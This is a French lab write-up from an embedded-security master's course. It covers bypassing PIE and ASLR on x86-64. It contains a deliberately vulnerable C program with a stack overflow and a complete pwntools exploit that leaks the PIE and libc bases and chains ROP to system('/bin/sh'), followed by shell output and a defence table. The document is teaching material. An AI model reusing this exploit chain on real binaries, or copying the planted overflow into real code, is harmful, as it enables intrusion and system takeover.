# Write-up — Lab 07 : PIE Bypass — PIE + ASLR

> **Embedded Security — C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![PIE Bypass](https://img.shields.io/badge/PIE-Bypassed-red.svg)]()
[![ASLR Bypass](https://img.shields.io/badge/ASLR-Bypassed-red.svg)]()
[![pwntools](https://img.shields.io/badge/pwntools-ROP%28%29-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** NX + ASLR + PIE actifs — binaire ET libc chargés à des adresses aléatoires  
**Technique :** 3 étapes — leak PIE via printf → leak libc via puts@GOT → ret2libc  
**Preuve PIE :** `PIE base` différente entre chaque exécution  
**Résultat :** Shell interactif — `id`, `whoami`, `cat /etc/passwd`

---

## 2. Environnement

```text
OS     : WSL2 Ubuntu — Linux 6.6
gcc    : -g -fno-stack-protector  (PIE activé par défaut)
ASLR   : actif (/proc/sys/kernel/randomize_va_space = 2)
```

**checksec :**

```
Stack:  No canary found
NX:     NX enabled          ← shellcode impossible
PIE:    PIE enabled         ← adresses binaire aléatoires
ASLR:   actif               ← adresses libc aléatoires
SHSTK:  Enabled
IBT:    Enabled
```

---

## 3. Problème : PIE rend les adresses du binaire imprévisibles

En Lab 06, le binaire était compilé avec `-no-pie` → adresses fixes à `0x400000`.

Avec PIE actif :
```
Run 1 : PIE base : 0x5607a3f00000   main @ 0x5607a3f011c5
Run 2 : PIE base : 0x563d4b200000   main @ 0x563d4b2011c5
```

Les gadgets (`pop rdi; ret`), le PLT et le GOT changent à chaque run — impossible de les hardcoder. Il faut calculer la base PIE depuis une adresse leakée.

---

## 4. Code vulnérable — `target.c`

```c
#include <stdio.h>
#include <unistd.h>

// Gadget explicite : pop rdi ; ret
__asm__(".global pop_rdi\npop_rdi:\n\tpop %rdi\n\tret\n");

int main();  // declaration anticipee pour l'utiliser comme pointeur

void vulnerable() {
    char buffer[64];

    // PIE leak : affiche l'adresse reelle de main → permet de calculer la base PIE
    printf("main @ %p\n", main);
    puts("Input :");          // force puts dans PLT (necessaire pour le leak libc)
    fflush(stdout);
    read(0, buffer, 200);     // overflow volontaire
}

int main() {
    vulnerable();
    return 0;
}
```

**Deux rôles du code :**
- `printf("main @ %p\n", main)` — offre gratuitement l'adresse de `main` → base PIE calculable
- `puts("Input :")` — force `puts` dans le PLT → utilisable pour le leak libc au Stage 2

---

## 5. Stratégie en 3 étapes

```
┌─────────────────────────────────────────────────────────┐
│  STAGE 1 — PIE leak (sans overflow)                     │
│                                                         │
│  Le programme affiche : "main @ 0x5607..."              │
│  elf.address = main_leaked - elf.sym['main']            │
│  → Tous les offsets binaire deviennent connus           │
└─────────────────────────────────────────────────────────┘
              │
              ▼  base PIE connue → gadgets, PLT, GOT localisables
┌─────────────────────────────────────────────────────────┐
│  STAGE 2 — Libc leak (overflow #1)                      │
│                                                         │
│  pop rdi → puts@GOT → puts@PLT → vulnerable()          │
│  puts affiche l'adresse reelle de puts dans libc        │
│  libc.address = leaked_puts - libc.symbols['puts']      │
└─────────────────────────────────────────────────────────┘
              │
              ▼  base libc connue → system(), /bin/sh localisables
┌─────────────────────────────────────────────────────────┐
│  STAGE 3 — Shell (overflow #2)                          │
│                                                         │
│  ret (alignement) → pop rdi → /bin/sh → system()       │
└─────────────────────────────────────────────────────────┘
```

---

## 6. Exploit — `exploit.py`

```python
from pwn import *

elf  = ELF('./target')
libc = elf.libc
context.binary = elf
context.log_level = 'info'

p = process('./target')

# ── STAGE 1 — PIE leak ──
line = p.recvline()                                    # "main @ 0x5..."
main_leaked = int(line.split(b'@ ')[1].strip(), 16)
log.success(f"main @ {hex(main_leaked)}")

elf.address = main_leaked - elf.sym['main']
log.success(f"PIE base : {hex(elf.address)}")

# ── STAGE 2 — Libc leak : puts(puts@GOT) → retour a vulnerable ──
rop1 = ROP(elf)
rop1.call(elf.plt['puts'], [elf.got['puts']])
rop1.call(elf.sym['vulnerable'])

OFFSET = 72
p.recvuntil(b'Input :\n')
payload1 = b'A' * OFFSET + rop1.chain()
p.send(payload1)

leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"puts @ {hex(leaked_puts)}")

libc.address = leaked_puts - libc.symbols['puts']
log.success(f"libc base : {hex(libc.address)}")

# ── STAGE 3 — Shell ──
rop2       = ROP([elf, libc])
ret_gadget = rop2.find_gadget(['ret'])[0]
binsh  = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

rop2.raw(ret_gadget)
rop2.call(system, [binsh])

p.recvline()                  # "main @ ..." de la 2e execution de vulnerable()
p.recvuntil(b'Input :\n')
payload2 = b'A' * OFFSET + rop2.chain()
p.send(payload2)

log.success("Shell obtenu")
p.interactive()
```

---

## 7. Chaînes ROP

**Stage 2 (adresses variables selon le run) :**
```
0x0000:  0x5607...176  pop rdi; ret    ← gadget binaire (offset fixe depuis PIE base)
0x0008:  0x5607...018  got.puts        ← GOT entry (offset fixe depuis PIE base)
0x0010:  0x5607...064  puts@PLT        ← affiche got.puts → leak libc
0x0018:  0x5607...178  vulnerable()    ← 2e input
```

**Stage 3 (adresses variables selon le run) :**
```
0x0000:  0x5607...01a  ret             ← alignement stack 16 octets
0x0008:  0x5607...176  pop rdi; ret
0x0010:  0x7f...cb42f  /bin/sh         ← libc_base + offset
0x0018:  0x7f...58750  system()        ← libc_base + offset
```

---

## 8. Résultat

```
[+] main @ 0x5607a3f011c5
[+] PIE base : 0x5607a3f00000
[+] puts @ 0x76095d487be0
[+] libc base : 0x76095d400000
[+] Shell obtenu
$ id
uid=1000(angevirus) groups=1000(angevirus),4(adm),27(sudo),989(ollama),1001(docker)
$ whoami
angevirus
$ cat /etc/passwd  → lecture fichiers systeme
$ cat /proc/version → version kernel WSL2
```

> Screenshot : [docs/lab07_pie_bypass.png](docs/lab07_pie_bypass.png)

---

## 9. Progression des protections

| Lab | Technique | NX | Canary | PIE | ASLR |
| --- | --- | --- | --- | --- | --- |
| 02 | ret2win manuel | Off | Off | Off | Off |
| 03 | ret2win pwntools | Off | Off | Off | Off |
| 04 | Format String | On | Off | Off | Off |
| 05 | ROP ret2libc | On | Off | Off | Off |
| 06 | ret2plt + ret2libc | On | Off | Off | On |
| **07** | **PIE leak + ret2libc** | **On** | **Off** | **On** | **On** |

---

## 10. Défense

| Vecteur | Mesure |
| --- | --- |
| PIE leak via printf | Ne jamais afficher d'adresses internes vers l'utilisateur |
| ASLR bypass via GOT | **Full RELRO** — rend la GOT read-only (mais ne bloque pas les reads) |
| ROP ret2libc | Activer **Stack Canary** (`-fstack-protector-strong`) |
| Overflow | `read(0, buf, sizeof(buf))` — limiter la taille à la déclaration |
| Gadgets ROP | **Shadow Stack (SHSTK / Intel CET)** — valide les adresses de retour |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Vulnérabilité | Stack buffer overflow — offset 72 |
| Protections contournées | PIE + ASLR |
| Stage 1 | Lecture de `main @ %p` → calcul base PIE |
| Stage 2 | puts(puts@GOT) via ROP → calcul base libc |
| Stage 3 | ret (alignement) + system("/bin/sh") |
| Résultat | Shell interactif — 2 runs, 2 bases PIE et libc différentes |

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
